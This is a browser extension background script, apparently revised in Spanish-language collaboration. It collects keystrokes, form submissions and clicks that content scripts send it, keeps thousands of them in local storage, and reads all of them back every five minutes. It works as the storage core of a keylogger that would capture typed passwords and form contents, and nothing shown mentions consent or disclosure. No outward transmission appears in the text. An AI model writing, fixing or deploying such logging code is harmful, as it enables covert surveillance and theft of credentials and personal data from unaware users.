// background.js 

if (typeof browser === "undefined") {
    var browser = chrome;
}

browser.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === 'keystroke') {
        saveKeystroke(message.data);
    } else if (message.type === 'form_submit') {
        saveFormData(message.data);
    } else if (message.type === 'click') {
        saveClick(message.data);
    }
    
    return true; 
});

function saveKeystroke(data) {
    browser.storage.local.get(['keystrokes'], function(result) {
        let keystrokes = result.keystrokes || [];
        keystrokes.push(data);
        
        if (keystrokes.length > 10000) { // 10k
            keystrokes = keystrokes.slice(-10000);
        }
        
        // ARREGLO 2: Se usa 'browser'
        browser.storage.local.set({ keystrokes: keystrokes });
    });
}

function saveFormData(data) {
    browser.storage.local.get(['forms'], function(result) {
        let forms = result.forms || [];
        forms.push(data);
        
        if (forms.length > 500) { // Tu límite original
            forms = forms.slice(-500);
        }
        
        // ARREGLO 2: Se usa 'browser'
        browser.storage.local.set({ forms: forms });
    });
}

function saveClick(data) {
    browser.storage.local.get(['clicks'], function(result) {
        let clicks = result.clicks || [];
        clicks.push(data);
        
        if (clicks.length > 2000) { // Tu límite original
            clicks = clicks.slice(-2000);
        }
        
        // ARREGLO 2: Se usa 'browser'
        browser.storage.local.set({ clicks: clicks });
    });
}

setInterval(() => {
    browser.storage.local.get(null, function(data) {
        // ... (Log de consola eliminado)
    });
}, 300000); // 5 minutos